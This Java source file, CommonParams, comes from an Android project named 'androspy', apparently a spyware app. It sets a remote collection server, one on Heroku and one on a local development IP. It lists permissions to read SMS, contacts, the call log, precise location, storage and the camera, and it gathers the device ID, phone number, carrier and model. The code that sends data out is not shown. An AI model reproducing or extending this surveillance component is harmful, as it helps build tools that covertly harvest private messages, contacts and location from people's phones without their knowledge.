package buddy.ap.com.androspy;

//uid = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
//        device = android.os.Build.MODEL;
//        sdk = Integer.valueOf(Build.VERSION.SDK_INT).toString(); //Build.VERSION.RELEASE;
//        version = Build.VERSION.RELEASE;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;

public class CommonParams {

    static final String PRODUCTION_SERVER = "https://obscure-escarpment-69091.herokuapp.com";
    static final String DEVELOPMENT_SERVER = "http://192.168.1.251:3000";

    private Context context;
    private String server;
    private String uid;
    private String sdk;
    private String version;
    private String phone;
    private String provider;
    private String device;

    public final static String[] PERMISSIONS = {
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
    };

    public CommonParams(Context context) {
        this.context = context;
        server = BuildConfig.DEBUG ? DEVELOPMENT_SERVER : PRODUCTION_SERVER;
        uid = Settings.Secure.getString(context.getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
        sdk = Integer.valueOf(Build.VERSION.SDK_INT).toString();
        version = Build.VERSION.RELEASE;

        TelephonyManager telephonyManager = ((TelephonyManager) context.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
        provider = telephonyManager.getNetworkOperatorName();
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            phone = telephonyManager.getLine1Number();
        }
        device = android.os.Build.MODEL;
    }

    public String getServer() {
        return this.server;
    }

    public String getUid() {
        return this.uid;
    }

    public String getSdk() {
        return this.sdk;
    }

    public String getVersion() {
        return version;
    }

    public String getPhone() {
        return phone;
    }

    public String getProvider() {
        return provider;
    }

    public String getDevice() {
        return device;
    }
}
